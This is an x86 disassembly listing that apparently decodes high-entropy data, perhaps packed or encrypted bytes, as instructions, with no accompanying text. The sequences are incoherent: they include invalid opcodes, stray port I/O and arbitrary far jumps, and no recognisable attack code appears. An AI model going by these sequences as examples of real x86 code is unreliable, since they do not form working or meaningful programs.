  4092c2:	add    eax,0xbac5985c
  4092c7:	pop    edi
  4092c8:	adc    BYTE PTR [ecx+ecx*8+0x4a8a43d2],0xab
  4092d0:	sbb    al,0x69
  4092d2:	ror    DWORD PTR [ecx-0x796994ee],0xba
  4092d9:	jg     0x40929b
  4092db:	push   edi
  4092dc:	repz es add ch,cl
  4092e0:	dec    esp
  4092e1:	pop    ss
  4092e2:	inc    esi
  4092e3:	sbb    eax,0x7363ec5e
  4092e8:	rol    DWORD PTR [ebx+0x1e5365f3],0x15
  4092ef:	mov    cl,0x9f
  4092f1:	mov    ds:0xbab3ffd9,eax
  4092f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f7:	push   ss
  4092f8:	das    
  4092f9:	pop    esp
  4092fa:	jnp    0x409319
  4092fc:	mov    dx,0xf48b
  409300:	fcom   DWORD PTR [ebp+0x66f27c3]
  409306:	out    dx,eax
  409307:	cmp    edx,DWORD PTR [esi+0x42]
  40930a:	mov    dl,0x69
  40930c:	and    al,0x57
  40930e:	mov    ecx,DWORD PTR [ebp+0x5f9a81f4]
  409314:	bound  eax,QWORD PTR [eax-0x4b]
  409317:	dec    edi
  409318:	cmp    al,0x23
  40931a:	xor    al,0x16
  40931c:	push   ebp
  40931d:	cmp    DWORD PTR [ebp+0x44],0x54
  409321:	cld    
  409322:	mov    edx,0xeae4d5d8
  409327:	dec    ecx
  409328:	lahf   
  409329:	ja     0x4092c1
  40932b:	test   BYTE PTR [edi],bl
  40932d:	add    ch,BYTE PTR [ebx+0x6491adf8]
  409333:	into   
  409334:	lea    edx,[ecx-0x31]
  409337:	je     0x40932a
  409339:	imul   ebx,DWORD PTR [edi],0xe4053181
  40933f:	mov    ds:0x11732322,eax
  409344:	jle    0x409396
  409346:	stos   BYTE PTR es:[edi],al
  409347:	inc    ebp
  409348:	xchg   ecx,eax
  409349:	aas    
  40934a:	cmc    
  40934b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40934c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40934d:	lahf   
  40934e:	adc    DWORD PTR [eax],0x89edbd5a
  409354:	jg     0x4093ce
  409356:	dec    eax
  409357:	jb     0x409366
  409359:	pop    ebp
  40935a:	pop    ds
  40935b:	sub    DWORD PTR [edx+0x3984599a],0x9131174e
  409365:	es dec esp
  409367:	inc    esp
  409368:	sub    BYTE PTR [ecx],bh
  40936a:	inc    eax
  40936b:	out    0x3,eax
  40936d:	or     eax,0xe958e90f
  409372:	je     0x4093d8
  409374:	icebp  
  409375:	int3   
  409376:	xor    cl,BYTE PTR [edx-0x260e5a12]
  40937c:	jbe    0x4093ca
  40937e:	lods   al,BYTE PTR ds:[esi]
  40937f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409380:	inc    edi
  409381:	mov    al,ds:0x64461fa1
  409386:	xor    BYTE PTR [ebx+0x68],ah
  409389:	sbb    esi,0xd96d3d6a
  40938f:	in     eax,0x40
  409391:	mov    esp,0x5ff107e
  409396:	lods   al,BYTE PTR ds:[esi]
  409397:	inc    bp
  409399:	ret    
  40939a:	idiv   BYTE PTR [eax-0x9c61b8f]
  4093a0:	fist   WORD PTR [eax-0x31371a99]
  4093a6:	hlt    
  4093a7:	(bad)  
  4093a8:	xchg   ebp,eax
  4093a9:	popa   
  4093aa:	push   esi
  4093ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ac:	test   al,0x4b
  4093ae:	in     al,dx
  4093af:	dec    esi
  4093b0:	add    al,0xf8
  4093b2:	jae    0x4093b3
  4093b4:	pusha  
  4093b5:	xor    al,ah
  4093b7:	out    dx,eax
  4093b8:	inc    eax
  4093b9:	and    al,0xdd
  4093bb:	dec    ebp
  4093bc:	rol    BYTE PTR [eax+0x1f388080],cl
  4093c2:	or     edx,DWORD PTR [eax+0x5e213258]
  4093c8:	popa   
  4093c9:	not    DWORD PTR [esi]
  4093cb:	test   DWORD PTR [ecx+edx*4],ebx
  4093ce:	frstor [edx+0xe79a40]
  4093d4:	cmp    BYTE PTR [edx+0x41],bl
  4093d7:	retf   
  4093d8:	dec    esi
  4093d9:	mov    ebx,0xb4a890d7
  4093de:	push   edi
  4093df:	jo     0x40941c
  4093e1:	gs mov dh,0x7d
  4093e4:	(bad)  
  4093e5:	cmp    dl,al
  4093e7:	push   ebp
  4093e8:	xchg   BYTE PTR [esi+eiz*8+0x61],ch
  4093ec:	into   
  4093ed:	out    0xff,al
  4093ef:	rcl    BYTE PTR [esi+0xf1168c8],0x58
  4093f6:	xor    BYTE PTR [edi-0x5f34d473],0x2c
  4093fd:	jl     0x409394
  4093ff:	or     eax,0x1ea9fa9e
  409404:	or     BYTE PTR [ebp+0x5],0x4a
  409408:	arpl   WORD PTR [ecx+0x19877a35],ax
  40940e:	and    eax,0x6942775e
  409413:	and    al,0xa8
  409415:	test   BYTE PTR [eax-0x14],dh
  409418:	xor    BYTE PTR [ecx+0x16],0xb8
  40941c:	xor    esp,esp
  40941e:	repz xor BYTE PTR [esi-0xdfbac92],cl
  409425:	loopne 0x4093e3
  409427:	mov    BYTE PTR [edi-0x68deb004],cl
  40942d:	push   edi
  40942e:	int3   
  40942f:	sbb    eax,0x6f746df1
  409434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409435:	sub    DWORD PTR [ecx-0x408cfa75],eax
  40943b:	xchg   esi,eax
  40943c:	es dec edx
  40943e:	add    edi,DWORD PTR [ecx-0x25]
  409441:	retf   
  409442:	inc    esi
  409443:	mov    ds:0x7169c610,al
  409448:	enter  0x8e00,0xea
  40944c:	jb     0x409465
  40944e:	sahf   
  40944f:	daa    
  409450:	dec    ecx
  409451:	shl    DWORD PTR [edi],0xa6
  409454:	out    0x83,al
  409456:	call   0x101cef93
  40945b:	mov    ds:0x298fd41b,eax
  409460:	popa   
  409461:	pop    ds
  409462:	push   esi
  409463:	push   edx
  409464:	inc    ebx
  409465:	pavgb  mm5,mm4
  409468:	sub    DWORD PTR ds:0xa1e5eb5,ecx
  40946e:	fwait
  40946f:	jbe    0x4094e0
  409471:	push   esi
  409472:	and    ch,BYTE PTR [edx-0x70c899d7]
  409478:	stc    
  409479:	call   0xe496:0xbc5f35bf
  409480:	out    0xb8,eax
  409482:	mov    esi,0x6fed5241
  409487:	xchg   BYTE PTR [edx+ebp*2+0x14d61edf],bh
  40948e:	xor    eax,0x5ada4cf3
  409493:	retf   0xc61
  409496:	outs   dx,BYTE PTR ss:[esi]
  409498:	add    edx,ebp
  40949a:	adc    BYTE PTR [edx+0x14eb694c],bl
  4094a0:	push   edx
  4094a1:	sub    dh,BYTE PTR [edi+edi*1+0x52]
  4094a5:	leave  
  4094a6:	not    BYTE PTR [ebp-0x13f1149a]
  4094ac:	sbb    dl,BYTE PTR [esp+eiz*4]
  4094af:	inc    esi
  4094b0:	jne    0x4094e1
  4094b2:	sub    bh,bl
  4094b4:	add    edx,DWORD PTR [ebx-0x745321b]
  4094ba:	sbb    DWORD PTR [ebx+0x6b],edi
  4094bd:	sbb    eax,0x88936737
  4094c2:	shl    ecx,0xda
  4094c5:	xchg   edx,eax
  4094c6:	jle    0x409491
  4094c8:	jg     0x409541
  4094ca:	pop    ebx
  4094cb:	test   DWORD PTR [ebp-0x3e],ebx
  4094ce:	xor    al,0x4b
  4094d0:	jecxz  0x409517
  4094d2:	add    dh,BYTE PTR [esi]
  4094d4:	xchg   esi,eax
  4094d5:	cmc    
  4094d6:	cmp    BYTE PTR [edx-0x641f0305],ah
  4094dc:	sbb    bh,cl
  4094de:	iret   
  4094df:	div    edx
  4094e1:	out    dx,eax
  4094e2:	clc    
  4094e3:	push   0x9e4868e7
  4094e8:	mov    bl,0xf1
  4094ea:	mov    ds:0xa25be5ca,al
  4094ef:	mov    dh,0xbf
  4094f1:	jno    0x40950a
  4094f3:	icebp  
  4094f4:	arpl   WORD PTR [edi+eiz*1],dx
  4094f7:	jmp    0x4094a9
  4094f9:	lock cmp ah,ch
  4094fc:	int3   
  4094fd:	or     BYTE PTR [eax-0x69],bh
  409500:	xor    ch,BYTE PTR [edi]
  409502:	sahf   
  409503:	int    0xcb
  409505:	mov    dh,0xa4
  409507:	jne    0x409520
  409509:	icebp  
  40950a:	addr16 sub al,0x81
  40950d:	out    0xf2,eax
  40950f:	retf   
  409510:	sbb    DWORD PTR fs:[eax],ebx
  409513:	sbb    eax,0x8ccf1a2f
  409518:	lods   eax,DWORD PTR ds:[esi]
  409519:	mov    edx,0xe42f30ad
  40951e:	shl    DWORD PTR [edx+0x6c],1
  409521:	rcr    esi,cl
  409523:	aaa    
  409524:	stos   BYTE PTR es:[edi],al
  409525:	adc    esp,esp
  409527:	add    eax,0xd62116a2
  40952c:	xchg   edi,eax
  40952d:	imul   ecx,DWORD PTR [ebx],0x3d33237c
  409533:	jp     0x409596
  409535:	jmp    0x409562
  409537:	iret   
  409538:	add    DWORD PTR [edi+eiz*2],esi
  40953b:	into   
  40953c:	rol    DWORD PTR [eax-0x6f1d851c],0x89
  409543:	pop    edi
  409544:	jbe    0x40954b
  409546:	ins    DWORD PTR es:[edi],dx
  409547:	sub    al,bh
  409549:	aaa    
  40954a:	out    0xd1,eax
  40954c:	mov    dl,0x47
  40954e:	adc    BYTE PTR [edx-0x76],ah
  409551:	adc    al,0xb6
  409553:	push   ds
  409554:	mov    eax,ds:0x8fba3356
  409559:	fwait
  40955a:	imul   esi,eax,0x8fbb92b
  409560:	sub    al,0xcc
  409562:	in     eax,dx
  409563:	add    al,0x4
  409565:	jmp    0xd619:0x4ec72cdb
  40956c:	das    
  40956d:	sub    al,0x4b
  40956f:	add    BYTE PTR [esi-0x53],al
  409572:	cmp    eax,0xe5314176
  409577:	pop    esi
  409578:	shr    ebp,0x7e
  40957b:	call   FWORD PTR [esp]
  40957e:	cli    
  40957f:	xor    ah,al
  409581:	scas   al,BYTE PTR es:[edi]
  409582:	test   eax,0xc58be22a
  409587:	push   0xffffff88
  409589:	jae    0x409604
  40958b:	fsub   DWORD PTR [edx+0x9]
  40958e:	pop    edx
  40958f:	mov    WORD PTR [esi-0x50],ds
  409592:	out    dx,eax
  409593:	outs   dx,BYTE PTR ds:[esi]
  409594:	ss aaa 
  409596:	std    
  409597:	inc    eax
  409598:	es cmc 
  40959a:	in     eax,0x59
  40959c:	pushf  
  40959d:	cmp    cl,ch
  40959f:	mov    ds:0xb4cbbe36,eax
  4095a4:	fild   WORD PTR ds:0x9de8830c
  4095aa:	dec    ecx
  4095ab:	scas   eax,DWORD PTR es:[edi]
  4095ac:	int    0xdf
  4095ae:	add    DWORD PTR [esi],edi
  4095b0:	mov    esp,0x49132035
  4095b5:	sbb    eax,0xba29e3b4
  4095ba:	ret    0xa161
  4095bd:	sub    dh,BYTE PTR [eax+0x3e]
  4095c0:	add    al,0xdf
  4095c2:	das    
  4095c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c4:	popf   
  4095c5:	retf   0x71b4
  4095c8:	add    BYTE PTR [ebx+0x677c3221],dh
  4095ce:	addr16 mov bx,0x1a44
  4095d3:	into   
  4095d4:	mov    dh,BYTE PTR [ebp+edx*4-0x5f]
  4095d8:	fist   WORD PTR [ebp+0x2f]
  4095db:	pop    ss
  4095dc:	jge    0x40959d
  4095de:	sub    esp,DWORD PTR [ebx+0x8e35c5a]
  4095e4:	mov    edi,0xe0fda75b
  4095e9:	pop    eax
  4095ea:	iret   
  4095eb:	cmp    ebx,DWORD PTR [edx+0x75]
  4095ee:	rol    BYTE PTR [ebx-0x746e7d89],cl
  4095f4:	sub    edi,ebx
  4095f6:	(bad)  
  4095f7:	dec    esi
  4095f8:	push   0x62
  4095fa:	mov    ch,0x45
  4095fc:	daa    
  4095fd:	fcom   DWORD PTR [ebx+0x64a837ca]
  409603:	push   ds
  409604:	aas    
  409605:	test   BYTE PTR [ebx+0x72f78ca5],dh
  40960b:	add    DWORD PTR [eax],edi
  40960d:	test   eax,0xd30843d9
  409612:	mov    eax,DWORD PTR [ebx-0x16]
  409615:	mov    al,0xfb
  409617:	(bad)  
  409618:	stos   DWORD PTR es:[edi],eax
  409619:	stos   BYTE PTR es:[edi],al
  40961a:	rol    BYTE PTR [edi+eiz*2],1
  40961d:	sbb    esi,DWORD PTR [ebp+0x29]
  409620:	adc    BYTE PTR [ecx-0x64],dl
  409623:	sti    
  409624:	imul   ebp,DWORD PTR [edx],0xffffffee
  409627:	setb   BYTE PTR [esi-0x3b8ba60b]
  40962e:	cmp    DWORD PTR [esi-0x31ec36a1],ebp
  409634:	pmulhw mm0,QWORD PTR [edi]
  409637:	mov    dl,0x17
  409639:	mov    esi,0xc97c52e8
  40963e:	imul   ebp,DWORD PTR [edx],0xce926348
  409644:	add    al,0x12
  409646:	xchg   ecx,eax
  409647:	mov    edx,0xb6954e48
  40964c:	mov    bl,0x73
  40964e:	(bad)
  409651:	lods   al,BYTE PTR ds:[esi]
  409652:	fs inc ecx
  409654:	icebp  
  409655:	sub    eax,0x24596fa
  40965a:	test   al,0xe7
  40965c:	popf   
  40965d:	and    esi,DWORD PTR [edx]
  40965f:	jno    0x409678
  409661:	nop
  409662:	sub    BYTE PTR [ecx],ch
  409664:	mov    bh,0xf3
  409666:	ficom  DWORD PTR [edi+0x4cfb2337]
  40966c:	cmp    bl,BYTE PTR [ecx]
  40966e:	xor    eax,0x2959d9d0
  409673:	fistp  QWORD PTR ss:[edi-0x76ac7309]
  40967a:	cmp    DWORD PTR [ecx-0x11cc190a],0x72199c98
  409684:	scas   al,BYTE PTR es:[edi]
  409685:	gs (bad) 
  409687:	test   al,0x81
  409689:	or     edi,edi
  40968b:	ss xchg esp,eax
  40968d:	jae    0x409664
  40968f:	fistp  QWORD PTR [ecx+0x71d62023]
  409695:	jmp    0x9b8c:0x85620ab
  40969c:	xchg   edi,eax
  40969d:	push   esi
  40969e:	mov    al,ds:0x569c14f7
  4096a4:	mov    ah,0x10
  4096a6:	jo     0x40971f
  4096a8:	aas    
  4096a9:	adc    esi,ecx
  4096ab:	fdivr  st,st(5)
  4096ad:	jl     0x409662
  4096af:	pushf  
  4096b0:	push   ebp
  4096b1:	adc    DWORD PTR [eax],0x62
  4096b4:	int    0x87
  4096b6:	adc    edx,DWORD PTR [ecx-0x7dd5c4e1]
  4096bc:	jmp    0x7f806875
  4096c1:	mov    ds:0x43236aa5,eax
  4096c6:	cld    
  4096c7:	inc    ebx
  4096c8:	sub    al,0xc2
  4096ca:	pop    esp
  4096cb:	stos   DWORD PTR es:[edi],eax
  4096cc:	cmp    DWORD PTR [ebx],ebx
  4096ce:	or     bl,bh
  4096d0:	inc    ebx
  4096d1:	pusha  
  4096d2:	test   al,0xf7
  4096d4:	pop    ebp
  4096d5:	cmovbe ebx,DWORD PTR [ecx+edx*2]
  4096d9:	xor    ebp,esi
  4096db:	aas    
  4096dc:	or     al,0x50
  4096de:	or     al,0x8c
  4096e0:	dec    ebp
  4096e1:	in     eax,dx
  4096e2:	out    0x62,eax
  4096e4:	out    dx,al
  4096e5:	jo     0x4096a2
  4096e7:	das    
  4096e8:	inc    bx
  4096ea:	int    0xad
  4096ec:	loopne 0x4096ae
  4096ee:	fs jge 0x409716
  4096f1:	fwait
  4096f2:	cs inc ebp
  4096f4:	dec    ebp
  4096f5:	xchg   ebp,eax
  4096f6:	push   edi
  4096f7:	mov    dh,0x41
  4096f9:	inc    esp
  4096fa:	test   al,0x15
  4096fc:	adc    BYTE PTR [ebp+0x4a355d80],ch
  409702:	dec    ecx
  409703:	fld    TBYTE PTR [edx]
  409705:	sbb    ecx,DWORD PTR [eax]
  409707:	lods   eax,DWORD PTR ds:[esi]
  409708:	sbb    eax,0x39af6f58
  40970d:	int    0xb6
  40970f:	add    BYTE PTR [eax],dh
  409711:	sar    BYTE PTR ds:[eax+0x7692ffd2],1
  409718:	add    bl,BYTE PTR [eax+0x3d]
  40971b:	xor    eax,0x3351661a
  409720:	xor    cl,dh
  409722:	test   BYTE PTR [esi],cl
  409724:	adc    dh,BYTE PTR [ecx+0x67]
  409727:	inc    esi
  409728:	adc    al,0xd4
  40972a:	and    edi,eax
  40972c:	inc    esi
  40972d:	pop    edx
  40972e:	jmp    0xd5d93f65
  409733:	dec    edx
  409734:	cmp    ebx,DWORD PTR [esi-0x44]
  409737:	push   ss
  409738:	addr16 fsubr st(7),st
  40973b:	adc    cl,BYTE PTR ds:0x1fd72510
  409741:	arpl   sp,ax
  409743:	mov    cl,0x9d
  409745:	(bad)  [edi+0x3c]
  409748:	push   ss
  409749:	imul   DWORD PTR [edi+0x6f]
  40974c:	adc    al,0x23
  40974e:	retf   
  40974f:	fwait
  409750:	or     bl,BYTE PTR [ecx-0x33847cb2]
  409756:	inc    eax
  409757:	sub    eax,DWORD PTR [edi]
  409759:	aam    0x44
  40975b:	jecxz  0x409706
  40975d:	jmp    0x497b79a6
  409762:	jae    0x4097ce
  409764:	or     DWORD PTR ds:0x45d1faec,ebx
  40976a:	push   es
  40976b:	cmp    al,0x90
  40976d:	mov    DWORD PTR [eax+0x1c],ebp
  409770:	fbstp  TBYTE PTR [esi]
  409772:	inc    edi
  409773:	test   DWORD PTR [edi],eax
  409775:	inc    ecx
  409776:	add    eax,0x408d9b88
  40977b:	js     0x4097d4
  40977d:	pop    eax
  40977e:	jno    0x40975a
  409780:	btc    esp,esi
  409783:	jmp    0xaca7:0x3aa6338f
  40978a:	loopne 0x4097b9
  40978c:	imul   ecx,DWORD PTR [ecx-0x11],0xb35d31d8
  409793:	cmc    
  409794:	scas   eax,DWORD PTR es:[edi]
  409795:	data16 repnz cmp dh,BYTE PTR ds:0xecbdc797
  40979d:	bound  ebx,QWORD PTR [ecx+0xd]
  4097a0:	push   0xcc388265
  4097a5:	or     al,0x82
  4097a7:	mov    ds:0x5897d334,al
  4097ac:	and    al,0x21
  4097ae:	hlt    
  4097af:	inc    ebp
  4097b0:	fcomip st,st(4)
  4097b2:	and    BYTE PTR [esp+eax*8+0x5794d44],ah
  4097b9:	push   ss
  4097ba:	inc    ecx
  4097bb:	stc    
  4097bc:	stos   BYTE PTR es:[edi],al
  4097bd:	outs   dx,BYTE PTR ds:[esi]
  4097be:	aas    
  4097bf:	adc    eax,0xdd700c80
  4097c4:	adc    al,0xa2
  4097c6:	pop    ebp
  4097c7:	out    0xdb,al
  4097c9:	cmovs  ecx,DWORD PTR [ebp+0x59]
  4097cd:	ja     0x409750
  4097cf:	adc    ch,BYTE PTR [ebx+0x6a9d7349]
  4097d5:	lahf   
  4097d6:	jo     0x40979f
  4097d8:	pop    ss
  4097d9:	into   
  4097da:	adc    eax,0x4702323f
  4097df:	les    ebp,FWORD PTR [ebp-0x57]
  4097e2:	xchg   DWORD PTR [ebx-0x45],edx
  4097e5:	dec    ecx
  4097e6:	outs   dx,DWORD PTR ds:[esi]
  4097e7:	(bad)  
  4097e9:	cmp    al,0xa4
  4097eb:	mov    ecx,0xc46b796b
  4097f0:	das    
  4097f1:	mov    DWORD PTR [esi+0x3],eax
  4097f4:	pushf  
  4097f5:	mov    dl,0xae
  4097f7:	es in  eax,0x6a
  4097fa:	or     eax,0x6b98ac88
  4097ff:	sub    ecx,DWORD PTR [ecx+0x225db893]
  409805:	sbb    eax,0x7b65fd3d
  40980a:	push   ss
  40980b:	fidiv  WORD PTR [ebp+0x53]
  40980e:	frstpm(287 only) 
  409810:	mov    cl,0xef
  409812:	jo     0x409841
  409814:	and    DWORD PTR [eax],0x43
  409817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409818:	inc    ecx
  409819:	mov    edx,0xeb6706c6
  40981e:	dec    eax
  40981f:	sub    al,0xa0
  409821:	pop    ebx
  409822:	mov    cl,0x49
  409824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409825:	xchg   esp,eax
  409826:	cmp    edx,DWORD PTR [ecx-0x34]
  409829:	xchg   esi,eax
  40982a:	in     eax,0x53
  40982c:	(bad)  
  40982d:	jmp    0xe5a08035
  409832:	nop
  409833:	fstp   QWORD PTR [edx+ebp*1+0x315094c8]
  40983a:	pop    ecx
  40983b:	xor    esi,DWORD PTR [esi+0x49ade673]
  409841:	add    dl,BYTE PTR [esi*1-0x7eab07ff]
  409848:	cmp    dh,BYTE PTR [eax+esi*1]
  40984b:	and    ah,dl
  40984d:	cli    
  40984e:	dec    esi
  40984f:	pop    ebp
  409850:	xlat   BYTE PTR ds:[ebx]
  409851:	xchg   BYTE PTR [edi+0x1a],dh
  409854:	dec    eax
  409855:	retf   0xc34f
  409858:	cmp    eax,0x87c09a52
  40985d:	fidiv  WORD PTR [ebp-0x57]
  409860:	(bad)  
  409862:	jb     0x409830
  409864:	je     0x4098c5
  409866:	fnsave [edi+0x4a]
  409869:	cmp    DWORD PTR [ebx],ebx
  40986b:	fistp  QWORD PTR [esi+0x6a]
  40986e:	repnz pop eax
  409870:	nop
  409871:	in     al,0xcc
  409873:	sub    bh,bl
  409875:	jbe    0x409893
  409877:	sti    
  409878:	sub    ebp,DWORD PTR [eax-0x5222313]
  40987e:	leave  
  40987f:	push   edi
  409880:	outs   dx,BYTE PTR ds:[esi]
  409881:	in     al,dx
  409882:	cdq    
  409883:	push   edx
  409884:	sbb    BYTE PTR [ebx],0x4f
  409887:	lea    esi,[esi]
  409889:	outs   dx,DWORD PTR ds:[esi]
  40988a:	jae    0x40983f
  40988c:	mov    cl,0x5a
  40988e:	and    eax,0x7bd45c9d
  409893:	call   0x1752:0xf93aa569
  40989a:	cld    
  40989b:	lock (bad) 
  40989d:	or     eax,0xb049e1d2
  4098a2:	jmp    0x409837
  4098a4:	in     eax,0x94
  4098a6:	inc    ecx
  4098a7:	aas    
  4098a8:	push   edi
  4098a9:	adc    BYTE PTR ds:0xc33f3497,0x2d
  4098b0:	shr    edx,1
  4098b2:	sar    cl,cl
  4098b4:	(bad)  
  4098b5:	pop    esp
  4098b6:	(bad)  
  4098b8:	jb     0x40986f
  4098ba:	mov    edx,DWORD PTR [eax]
  4098bc:	aam    0x8a
  4098be:	pop    esi
  4098bf:	dec    ecx
  4098c0:	imul   ecx,ebx,0x7c
  4098c3:	addr16 inc edi
  4098c5:	mov    WORD PTR [esi-0x6a],fs
  4098c8:	push   esi
  4098c9:	data16 mov al,0xbb
  4098cc:	jae    0x40989b
  4098ce:	or     al,0x7f
  4098d0:	stos   BYTE PTR es:[edi],al
  4098d1:	fist   WORD PTR ds:0x9c359de0
  4098d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098d8:	xor    DWORD PTR [esp+eax*1-0x5dfe31ea],0xc094c971
  4098e3:	(bad)  
  4098e5:	and    edi,ebx
  4098e7:	dec    ebp
  4098e8:	pop    ds
  4098e9:	retf   0xf3a4
  4098ec:	inc    esp
  4098ed:	(bad)  
  4098ee:	mov    ebp,0xeb4ef941
  4098f3:	out    dx,al
  4098f4:	sub    DWORD PTR [edi+0x1],ebx
  4098f7:	push   ecx
  4098f8:	jno    0x4098b9
  4098fa:	out    dx,eax
  4098fb:	xor    BYTE PTR [esi+esi*4+0x5b46ae25],0xa2
  409903:	dec    edi
  409904:	add    al,0x92
  409906:	je     0x409942
  409908:	js     0x4098df
  40990a:	adc    DWORD PTR [eax],ebp
  40990c:	das    
  40990d:	mov    dh,0x20
  40990f:	inc    esp
  409910:	fsub   st,st(3)
  409912:	sub    esi,edx
  409914:	(bad)  
  409915:	aam    0xad
  409917:	pop    eax
  409918:	or     eax,0xae6c731b
  40991d:	js     0x4098ba
  40991f:	out    dx,eax
  409920:	push   0x52
  409922:	adc    ecx,eax
  409924:	xchg   esp,eax
  409925:	out    dx,al
  409926:	xor    ch,BYTE PTR [ecx+edi*1]
  409929:	mov    al,0x4e
  40992b:	aas    
  40992c:	popa   
  40992d:	fistp  DWORD PTR [ebp+0x21]
  409930:	pusha  
  409931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409932:	mov    bl,0x85
  409934:	xor    ecx,ebx
  409936:	sbb    DWORD PTR [ecx+ecx*1+0x12],esi
  40993a:	pusha  
  40993b:	sub    eax,0x93a3cc9c
  409940:	out    dx,al
  409941:	js     0x409991
  409943:	call   0x3b2f:0xcd9ecd25
  40994a:	mov    esi,0xb1a5eaed
  40994f:	xor    al,0xe7
  409951:	mov    cl,0xbd
  409953:	cmp    eax,DWORD PTR [ecx+0x30b514e7]
  409959:	xlat   BYTE PTR ds:[ebx]
  40995a:	sub    eax,0x2f7e53f2
  409960:	mov    cl,0x75
  409962:	cld    
  409963:	xchg   ebp,eax
  409964:	xor    al,BYTE PTR [ebx-0x5c931b24]
  40996a:	(bad)
  40996d:	test   ebp,edi
  40996f:	push   esp
  409970:	(bad)  [esi+0x28]
  409973:	mov    al,ds:0x3a262cb7
  409978:	das    
  409979:	ror    DWORD PTR [ebx+0x42],1
  40997c:	loope  0x409965
  40997e:	mov    al,ds:0x929b0466
  409983:	cmc    
  409984:	or     ah,BYTE PTR [edx-0x5a]
  409987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409988:	(bad)  
  40998a:	fld    TBYTE PTR [ebx+0x2]
  40998d:	push   edi
  40998e:	pop    esp
  40998f:	aaa    
  409990:	cmc    
  409991:	mov    ds:0x8d2edb60,al
  409996:	fimul  DWORD PTR [eax+0x6f]
  409999:	bound  edi,QWORD PTR [ebp+0x2c]
  40999c:	mov    al,0x49
  40999e:	ds fdivp st(5),st
  4099a1:	call   0xf324f879
  4099a6:	sub    dl,bh
  4099a8:	lock xor BYTE PTR [edi+0x2402cc97],0xba
  4099b0:	aas    
  4099b1:	mov    cl,0x66
  4099b3:	add    eax,0xb3c82b9
  4099b8:	stos   BYTE PTR es:[edi],al
  4099b9:	sti    
  4099ba:	inc    ebp
  4099bb:	cli    
  4099bc:	addr16 jge 0x4099bb
  4099bf:	jo     0x409a40
  4099c1:	test   al,0xdf
  4099c3:	inc    edx
  4099c4:	dec    eax
  4099c5:	adc    edx,DWORD PTR [edx+0x56]
  4099c8:	popa   
  4099c9:	mov    esp,0x3f0d5d05
  4099ce:	push   cs
  4099cf:	cwde   
  4099d0:	inc    ebp
  4099d1:	mov    edi,0xd16b9d33
  4099d6:	clc    
  4099d7:	fwait
  4099d8:	je     0x4099db
  4099da:	jae    0x4099cb
  4099dc:	sar    BYTE PTR [eax],cl
  4099de:	pusha  
  4099df:	or     esi,DWORD PTR [eax+0x60]
  4099e2:	js     0x409a21
  4099e4:	xchg   esp,eax
  4099e5:	sub    al,0xf2
  4099e7:	or     al,BYTE PTR [edx-0x3a]
  4099ea:	mov    al,0xab
  4099ec:	jmp    0x580be36e
  4099f1:	xor    ah,bl
  4099f3:	cmc    
  4099f4:	aas    
  4099f5:	mov    esp,0x9cca4c65
  4099fa:	pop    ecx
  4099fb:	popf   
  4099fc:	xor    ch,BYTE PTR [esi+0x10]
  4099ff:	pop    esp
  409a00:	adc    DWORD PTR [esp-0x7eb6a9b4],esi
  409a07:	jp     0x4099fe
  409a09:	daa    
  409a0a:	cli    
  409a0b:	add    DWORD PTR [ebx+0x79e793e2],ecx
  409a11:	sbb    DWORD PTR [ebx-0x79d4c1b7],eax
  409a17:	dec    ebp
  409a18:	fs loopne 0x409a03
  409a1b:	jge    0x4099d1
  409a1d:	pusha  
  409a1e:	retf   
  409a1f:	mov    ecx,0x4a28ade4
  409a24:	mov    al,0x3a
  409a26:	inc    ecx
  409a27:	aam    0x6f
  409a29:	mov    eax,0x26c2d334
  409a2e:	(bad)  
  409a2f:	out    0x6e,eax
  409a31:	or     ebp,ebp
  409a33:	mov    al,ds:0x5b7190b9
  409a38:	mov    edi,0x5d7a6a5f
  409a3d:	sbb    eax,0x69da913f
  409a42:	push   ds
  409a43:	in     eax,dx
  409a44:	add    eax,0x9db74f49
  409a49:	push   ebp
  409a4a:	push   esp
  409a4b:	sbb    BYTE PTR [ebp-0x18],al
  409a4e:	xchg   ebx,eax
  409a4f:	dec    ebp
  409a50:	xor    ecx,edx
  409a52:	pusha  
  409a53:	lds    ebx,FWORD PTR [ebx-0x143e7244]
  409a59:	push   edx
  409a5a:	mov    ch,0x15
  409a5c:	test   eax,0x826089c
  409a61:	mov    eax,0xac3380ab
  409a66:	mov    eax,0xa90cf124
  409a6b:	loop   0x409a1e
  409a6d:	jge    0x4099f9
  409a6f:	push   eax
  409a70:	jmp    0x20fe:0xc7bcab3a
  409a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a78:	daa    
  409a79:	and    BYTE PTR [esi-0x4d],dh
  409a7c:	inc    ecx
  409a7d:	scas   al,BYTE PTR es:[edi]
  409a7e:	adc    DWORD PTR [edi-0x3625b61e],eax
  409a84:	add    cl,BYTE PTR [esi]
  409a86:	les    ebp,FWORD PTR [ebx+eax*8-0x2b6433b6]
  409a8d:	mov    edx,0xa508bb12
  409a92:	aaa    
  409a93:	add    bh,BYTE PTR ds:0xf73cbbf9
  409a99:	gs stos BYTE PTR es:[edi],al
  409a9b:	cld    
  409a9c:	idiv   DWORD PTR [ecx+eax*4]
  409a9f:	enter  0x7250,0x56
  409aa3:	push   ecx
  409aa4:	push   es
  409aa5:	push   ds
  409aa6:	lds    esp,FWORD PTR [ecx+0x7a61f822]
  409aac:	sahf   
  409aad:	iret   
  409aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aaf:	test   eax,0x44f29548
  409ab4:	stc    
  409ab5:	popf   
  409ab6:	test   BYTE PTR [ebp+0x3c2b7eb9],dh
  409abc:	(bad)  
  409abd:	lods   al,BYTE PTR ds:[esi]
  409abe:	xchg   edi,eax
  409abf:	push   ebp
  409ac0:	push   0xb6c2924e
  409ac5:	and    dh,BYTE PTR [edx+0x2b]
